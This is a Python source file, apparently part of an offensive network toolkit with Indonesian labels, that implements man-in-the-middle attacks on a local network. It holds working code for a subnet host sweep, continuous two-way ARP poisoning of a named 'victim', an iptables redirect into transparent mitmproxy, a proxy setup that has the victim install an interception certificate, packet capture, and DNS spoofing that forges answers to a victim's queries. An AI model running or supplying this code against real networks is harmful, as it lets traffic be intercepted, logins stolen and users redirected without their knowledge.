# -*- coding: utf-8 -*-
"""MITM & traffic analysis."""
import threading
import time

from ..core import netutil as nu
from ._base import MODULES, mod

_stops = {}


def _scapy():
    try:
        from scapy.all import ARP, DNS, IP, UDP, send, sniff
        return True
    except Exception:
        return False


def _poison(victim, gateway, stop):
    from scapy.all import ARP, send
    while not stop.is_set():
        send(ARP(op=2, pdst=victim, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway), verbose=0)
        send(ARP(op=2, pdst=gateway, hwdst="ff:ff:ff:ff:ff:ff", psrc=victim), verbose=0)
        time.sleep(1.5)


@mod(name="mitm.scan", category="mitm", desc="Sweep host di subnet lokal", offline=True)
def host_scan(ctx):
    base = ".".join(nu.my_ip().split(".")[:3])
    arp = nu.arp_table()
    alive = nu.parallel([f"{base}.{i}" for i in range(1, 255)],
                        lambda ip: ip if nu.ping(ip, 1) else None, 64)
    for ip in alive:
        mac = arp.get(ip, "")
        ctx.out(f"  UP {ip} {mac}")
        ctx.finding("host di jaringan", "info", f"{ip} {mac}")
    return f"{len(alive)} host"


@mod(name="mitm.arp", category="mitm", desc="ARP poison dua arah (butuh root + scapy)",
     root=True, params={"target": {"required": True, "desc": "IP korban"},
                        "gateway": {"default": None}, "duration": {"default": 0}})
def arp(ctx):
    if not _scapy():
        ctx.out("  butuh scapy: pip install scapy"); return None
    gw = ctx.p("gateway") or nu.gateway()
    vic = ctx.p("target")
    stop = threading.Event()
    threading.Thread(target=_poison, args=(vic, gw, stop), daemon=True).start()
    ctx.out(f"  poisoning {vic} <-> {gw}")
    ctx.finding("arp spoof aktif", "info", f"{vic} <-> {gw}")
    end = time.time() + ctx.pi("duration")
    try:
        while not ctx.stopped and (ctx.pi("duration") == 0 or time.time() < end):
            time.sleep(0.5)
    finally:
        stop.set()
    return "arp selesai"


@mod(name="mitm.transparent", category="mitm", desc="ARP poison + redirect ke mitmproxy",
     root=True, needs=["mitmproxy", "scapy"],
     params={"target": {"required": True, "desc": "IP korban"}, "port": {"default": 8080},
             "duration": {"default": 0}})
def transparent(ctx):
    import os
    gw = nu.gateway()
    port = ctx.pi("port")
    stop = threading.Event()
    threading.Thread(target=_poison, args=(ctx.p("target"), gw, stop), daemon=True).start()
    ctx.exec(f"iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port {port}", 20)
    ctx.out(f"  redirect 80 -> {port}, mitmproxy transparan")
    try:
        os.system(f"mitmproxy --mode transparent --listen-port {port} --set block_global=false")
    finally:
        ctx.exec(f"iptables -t nat -D PREROUTING -p tcp --dport 80 -j REDIRECT --to-port {port}", 20)
        stop.set()
    return "mitm selesai"


@mod(name="mitm.proxy", category="mitm", desc="mitmproxy mode proxy eksplisit (non-root)",
     needs=["mitmproxy"], params={"port": {"default": 8080}})
def proxy(ctx):
    import os
    port = ctx.pi("port")
    ctx.out(f"  set proxy device lain ke {nu.my_ip()}:{port}")
    ctx.out("  buka http://mitm.it di device korban untuk sertifikat")
    ctx.finding("proxy mitm", "info", f"{nu.my_ip()}:{port}")
    try:
        os.system(f"mitmproxy --listen-port {port} --set block_global=false")
    except KeyboardInterrupt:
        pass
    return "proxy selesai"


@mod(name="mitm.capture", category="mitm", desc="Capture paket tcpdump", needs=["tcpdump"], root=True,
     params={"iface": {"default": "any"}, "duration": {"default": 60}, "filter": {"default": ""}})
def capture(ctx):
    p = f"/tmp/lw_cap_{int(time.time())}.pcap"
    cmd = f"timeout {ctx.pi('duration')} tcpdump -i {ctx.p('iface')} -w {p} {ctx.p('filter')}".strip()
    ctx.out(f"  {cmd}")
    rc, out, err = ctx.exec(cmd, ctx.pi("duration") + 30)
    ctx.out(out or err)
    try:
        data = open(p, "rb").read()
        ctx.artifact("capture.pcap", data, binary=True)
    except Exception:
        pass
    return p


@mod(name="mitm.dns", category="mitm", desc="DNS spoof via scapy (root)",
     root=True, params={"target": {"required": True, "desc": "IP korban"},
                        "domain": {"required": True, "desc": "domain dialihkan"},
                        "redirect": {"default": None, "desc": "IP tujuan"},
                        "duration": {"default": 60}})
def dns_spoof(ctx):
    if not _scapy():
        ctx.out("  butuh scapy"); return None
    from scapy.all import DNS, DNSRR, IP, UDP, send, sniff
    fake = ctx.p("redirect") or nu.my_ip()
    domain = ctx.p("domain")
    vic = ctx.p("target")

    def handle(pkt):
        if pkt.haslayer(DNS) and pkt[DNS].qd and domain in pkt[DNS].qd.qname.decode(errors="ignore"):
            resp = (IP(dst=pkt[IP].src, src=pkt[IP].dst) /
                    UDP(dport=pkt[UDP].sport, sport=53) /
                    DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                        an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=fake)))
            send(resp, verbose=0)

    ctx.out(f"  spoof {domain} -> {fake} untuk {vic}")
    ctx.finding("dns spoof", "info", f"{domain} -> {fake}")
    sniff(filter=f"udp port 53 and src host {vic}", prn=handle,
          timeout=ctx.pi("duration"), store=0)
    return "dns spoof selesai"
